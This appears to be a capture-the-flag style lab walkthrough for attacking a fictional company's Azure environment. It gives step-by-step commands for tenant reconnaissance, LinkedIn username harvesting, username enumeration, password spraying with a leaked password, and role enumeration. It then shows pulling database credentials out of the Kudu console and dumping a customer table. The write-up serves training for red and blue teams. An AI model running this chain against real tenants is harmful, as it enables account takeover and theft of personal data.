*This lab showcases how threat actors can get initial access to an Azure environment, and how they can go about gaining situational awareness and increasing their access. This lab is worth playing for both red and blue, in order to get an understanding of attacker tradecraft, and how this can be prevented. You'll get hands-on experience with red team tooling as well as making extensive use of native Azure CLI tools.*

## Learning outcomes  

- Unauthenticated and authenticated Azure enumeration
- Utilize red team tooling to get valid credentials and a foothold
- Entra ID user, group, role and RBAC enumeration
- Azure App Service Web App enumeration
- Leveraging Kudu diagnostic site for lateral movement
- Familiarity with the sqlcmd utility

## Notes

### Enumerate

- During enumeration you can use this URL `https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com&xml=1` to check if the company is using EntraID. You replace the login with the company name, if the `NameSpaceType` value shows as `Managed` then the company is using Entra ID.
	![[Pasted image 20241120110349.png]]
- To get the tenant ID we can use this URL `https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration` 
- You can also use [AADInternals](https://github.com/Gerenios/AADInternals) to get the same information. `Install-Module AADInternals` `Import-Module AADInternals`
- [Reference list of Azure domains](https://learn.microsoft.com/en-us/azure/security/fundamentals/azure-domains)
- Information from the web app suggest a naming convention for the employees, we can use [Omnispray](https://github.com/0xZDH/Omnispray)
### Credential Stuffing

- Very noisy but you can use Omnispray, [MSOLSpray](https://github.com/dafthack/MSOLSpray), TeamFilration.

## Links

[Peach Sandstorm password spray campaigns enable intelligence collection at high-value targets](https://www.microsoft.com/en-us/security/blog/2023/09/14/peach-sandstorm-password-spray-campaigns-enable-intelligence-collection-at-high-value-targets/)

[Overview of Defender for App Service to protect your Azure App Service web apps and APIs](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-app-service-introduction)

[Get-AzureADAuditSignInLogs](https://learn.microsoft.com/en-us/powershell/module/azuread/get-azureadauditsigninlogs?view=azureadps-2.0-preview)

---

### **1. Initial Reconnaissance**

We begin with just the domain name, `megabigtech.com`, and perform reconnaissance to determine whether the target uses **Azure Entra ID**.

#### **Command**:

`curl "https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com&xml=1"`

#### **Explanation**:

This command sends a request to Microsoft's user realm discovery endpoint. The returned XML contains the `NameSpaceType`. If it's `Managed`, the domain is using Azure Entra ID.

---

### **2. Identifying the Tenant**

Next, we extract the **Tenant ID** for the organization's Azure environment.

#### **Command**:

`curl "https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration"`

#### **Explanation**:

The OpenID configuration endpoint reveals details about the Azure AD tenant, including the **Tenant ID**, essential for crafting further attacks.

---

### **3. Domain Reconnaissance**

Using **AADInternals**, we verify the domain setup and gather additional DNS records.

#### **Commands**:

`Install-Module AADInternals Import-Module AADInternals Get-AADIntLoginInformation -Domain megabigtech.com Invoke-AADIntReconAsOutsider -DomainName megabigtech.com`

#### **Explanation**:

These commands identify if the domain uses **Office 365 services** and collect configurations like SPF, DKIM, and DMARC records. These records can indicate vulnerabilities in email authentication or policies.

---

### **4. Gathering Potential Usernames**

With the knowledge that Entra ID is in use, we search public platforms (e.g., LinkedIn) and use tools like **BridgeKeeper** to extract potential employee names.

#### **Command**:

`bridgekeeper --linkedin megabigtech`

#### **Explanation**:

This retrieves employee names from LinkedIn, enabling us to generate potential usernames (e.g., `first.last@megabigtech.com`).

---

### **5. Enumerating Valid Usernames**

We automate username validation using **Omnispray**, a modular framework.

#### **Command**:

`python3 omnispray.py --type enum -uf users.txt --module o365_enum_office`

#### **Explanation**:

This checks if provided usernames exist by interacting with the Azure AD authentication endpoint. Valid usernames prompt a password entry, whereas invalid ones return an error.

---

### **6. Credential Stuffing**

With a valid username (`yuki.tanaka@megabigtech.com`) and a password leaked from Pastebin (`MegaDev79$`), we attempt to log in using **MSOLSpray**.

#### **Commands**:

`$url = "https://github.com/dafthack/MSOLSpray/archive/master.zip" $output = "C:\Temp\master.zip" (New-Object System.Net.WebClient).DownloadFile($url, $output) Expand-Archive C:\Temp\master.zip -DestinationPath C:\Temp\MSOLSpray cd C:\Temp\MSOLSpray\MSOLSpray-master . .\MSOLSpray.ps1  Invoke-MSOLSpray -UserList user.txt -Password "MegaDev79$" -Verbose`

#### **Explanation**:

MSOLSpray automates password spraying against Azure AD logins. If the credentials are correct, we gain access to the account.

---

### **7. Enumerating Azure AD Tenant**

With valid credentials, we use PowerShell modules to gather details about users, groups, and roles.

#### **Commands**:

`Install-Module -Name Az -Repository PSGallery -Force Import-Module -Name Az Connect-AzAccount -Credential (Get-Credential) Connect-MgGraph -Scopes "User.Read.All"  Get-AzADUser -UserPrincipalName "yuki.tanaka@megabigtech.com" Get-MgUserMemberOf -UserId "yuki.tanaka@megabigtech.com"`

#### **Explanation**:

These commands query Entra ID for details about the compromised user, such as group memberships, roles, and service principals, to assess potential access.

---

### **8. Accessing Azure Resources**

We identify accessible resources using RBAC enumeration.

#### **Commands**:

`Get-AzResource Get-AzRoleAssignment -SignInName "yuki.tanaka@megabigtech.com"`

#### **Explanation**:

These commands reveal the user's assigned roles. For example, if the user has the **Website Contributor** role, they can manage Azure Web Apps.

---

### **9. Exploiting Azure Web App**

The compromised user has permissions to a Web App. We use **Kudu**, a backend diagnostic tool, to explore further.

#### **Command**:

Navigate to:

`https://megabigtechdevapp23.scm.azurewebsites.net`

#### **Explanation**:

This site provides direct access to the web app’s file system and environment variables. These variables may include credentials or configuration strings.

#### **Command**:

`env | grep -i -e "DB"`

#### **Explanation**:

We list environment variables to extract sensitive information, such as database connection strings.

---

### **10. Database Exploitation**

Using the extracted connection string, we query the Azure SQL database for sensitive information.

#### **Commands**:

`sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q "SELECT * FROM CustomerData"`

#### **Explanation**:

This command retrieves sensitive data from the target database, such as PII or proprietary information.